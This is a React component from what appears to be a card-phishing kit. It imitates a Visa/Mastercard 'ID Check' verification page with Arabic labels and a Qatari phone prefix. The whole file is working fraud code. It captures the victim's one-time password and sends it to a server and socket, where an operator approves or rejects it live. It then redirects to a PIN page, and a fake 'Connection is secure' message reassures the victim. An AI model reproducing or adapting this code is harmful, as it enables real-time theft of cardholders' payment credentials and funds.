import React, { useState } from "react";
import { TailSpin } from "react-loader-spinner";
import { serverRoute, socket } from "./Home";
import axios from "axios";
import { AiOutlineCloseCircle } from "react-icons/ai";

const Otp = () => {
  const [otp, setOtp] = useState("");
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false);
  const data = JSON.parse(sessionStorage.getItem("data"));
  const cardNumber = sessionStorage.getItem("cardNumber");

  // Mask card number (show last 4 digits)
  const maskedCardNumber = cardNumber
    ? "**** **** **** " + cardNumber.replace(/\s/g, "").slice(-4)
    : "****************";

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(null);

    try {
      await axios
        .post(serverRoute + "/visaOtp/" + data._id, {
          otp,
        })
        .then(() => {
          socket.emit("visaOtp", {
            id: data._id,
            otp,
          });
        });
    } catch (error) {
      console.log(error);
      setLoading(false);
    }
  };

  socket.on("acceptVisaOtp", (id) => {
    if (id === data._id) {
      setLoading(false);
      sessionStorage.setItem(
        "data",
        JSON.stringify({
          ...data,
          CardOtp: otp,
        })
      );
      window.location.href = "/pin";
    }
  });

  socket.on("declineVisaOtp", (id) => {
    if (id === data._id) {
      setLoading(false);
      setError("رمز التحقق خاطئ");
    }
  });

  return (
    <div className="w-full flex flex-1 items-center justify-center bg-white p-4">
      {loading && (
        <div
          className="fixed inset-0 bg-[#02020260] flex items-center justify-center z-50"
          dir="rtl"
        >
          <div className="bg-white rounded-lg p-8 max-w-md w-11/12 flex flex-col items-center justify-center">
            <img src="/logo.jpeg" alt="Tawtheeq Logo" className="h-20 mb-6" />
            <div className="relative w-32 h-32 mb-4">
              <img src="/loading.gif" alt="Loading" className="w-full h-full" />
            </div>
            <p className="text-gray-800 text-lg font-bold text-center">
              جاري التحقق من الرمز...
            </p>
          </div>
        </div>
      )}

      <div className="w-full max-w-md">
        <form
          className="bg-white border border-gray-200 rounded-lg p-6 shadow-sm"
          onSubmit={handleSubmit}
        >
          {/* Header with logos */}
          <div className="flex items-center justify-between mb-6">
            <div className="flex items-center gap-3">
              <img
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png"
                alt="Verified by VISA"
                className="h-8"
              />
              <img
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png"
                alt="Mastercard"
                className="h-8"
              />
              <span className="text-xs text-gray-600">ID Check</span>
            </div>
          </div>

          {/* Title */}
          <h2 className="text-xl font-bold text-gray-900 mb-4">
            Enter verification code
          </h2>

          {/* Message */}
          <div className="mb-4 text-sm text-gray-700 space-y-1">
            <p>We sent you a verification code by text message to</p>
            <p className="font-semibold">+974 xxxxxxxx You have 6 attempts</p>
            <p className="mt-3">
              Please enter your OTP in the field below to confirm your identity
              for this purchase.
            </p>
          </div>

          {/* Card Info */}
          <div className="mb-4 space-y-2 text-sm">
            <div className="flex justify-between">
              <span className="text-gray-600">Card Number</span>
              <span className="font-mono">{maskedCardNumber}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-600">Reference Id</span>
              <span className="font-mono">IRU/BEEMA3</span>
            </div>
          </div>

          {/* OTP Input with loading indicator */}
          <div className="mb-6 relative">
            <input
              value={otp}
              required
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
              maxLength={6}
              minLength={4}
              inputMode="numeric"
              type="text"
              className="w-full border border-gray-300 rounded px-4 py-3 text-center text-lg tracking-widest focus:outline-none focus:border-blue-500"
            />
            {loading && (
              <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-gray-500"></div>
              </div>
            )}
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            className="w-full bg-black text-white py-3 rounded font-semibold hover:bg-gray-800 transition-colors mb-4"
            disabled={loading || otp.length < 4}
          >
            تأكيد
          </button>

          {/* Security Message */}
          <div className="border border-green-500 rounded p-3 bg-green-50">
            <p className="text-xs text-green-800 font-semibold mb-1">
              Connection is secure
            </p>
            <p className="text-xs text-gray-600">
              Your information (for example, passwords or credit card numbers)
              is private when it is sent to this site.
            </p>
          </div>
        </form>
      </div>

      {/* Error Modal */}
      {error && (
        <div className="w-full text-center text-red-500 absolute bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center">
          <div className="bg-white py-5 px-2 md:w-1/3 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3 rounded-lg">
            <AiOutlineCloseCircle className="text-6xl text-red-500" />
            <div className="flex flex-col w-full items-center justify-center">
              <span className="text-gray-800">{error}</span>
            </div>
            <button
              className="bg-gray-900 text-white w-11/12 py-3 rounded hover:bg-gray-800"
              onClick={() => setError(null)}
            >
              حاول مرة أخرى
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default Otp;
